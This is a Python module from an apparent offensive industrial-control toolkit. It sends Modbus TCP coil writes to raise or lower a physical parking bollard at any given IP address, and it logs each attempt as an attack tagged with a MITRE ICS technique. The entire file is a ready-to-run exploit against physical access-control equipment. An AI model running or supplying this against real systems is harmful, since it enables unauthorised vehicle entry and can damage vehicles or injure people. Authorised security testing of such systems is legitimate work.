# modules/exploits/parking_bollard_override.py

import argparse
from pymodbus.client.sync import ModbusTcpClient
import json
import os
from datetime import datetime

LOG_FILE = "results/exploit_logs.json"
MITRE_TTP = "T0859"  # Physical Process Manipulation (ICS)

def log_attack(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def override_bollard(ip, port, coil_addr, action):
    client = ModbusTcpClient(ip, port=port)
    success = False
    try:
        if action.lower() == "lower":
            result = client.write_coil(coil_addr, True)
        elif action.lower() == "raise":
            result = client.write_coil(coil_addr, False)
        else:
            print("[!] Invalid action. Use 'raise' or 'lower'.")
            return

        success = result.function_code < 0x80
        print(f"[âœ“] Bollard {action} command sent to {ip}:{port} at coil {coil_addr}")
    except Exception as e:
        print(f"[!] Modbus error: {e}")
    finally:
        client.close()

    log_attack({
        "timestamp": datetime.utcnow().isoformat(),
        "target": f"{ip}:{port}",
        "coil": coil_addr,
        "action": action,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Bollard Override")
    parser.add_argument("--ip", required=True, help="Target IP address")
    parser.add_argument("--port", type=int, default=502, help="Modbus TCP port (default: 502)")
    parser.add_argument("--coil", type=int, required=True, help="Modbus coil address to toggle")
    parser.add_argument("--action", required=True, choices=["raise", "lower"], help="Action to perform")
    args = parser.parse_args()

    override_bollard(args.ip, args.port, args.coil, args.action)
